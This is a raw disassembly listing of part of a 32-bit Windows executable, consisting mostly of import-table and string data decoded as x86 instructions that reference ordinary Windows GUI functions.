  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc8],cl
  412441:	sub    al,0x3
	...
  41244b:	add    dl,ch
  41244d:	test   eax,0x4d49
  412452:	add    BYTE PTR [eax],al
  412454:	jp     0x41247a
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
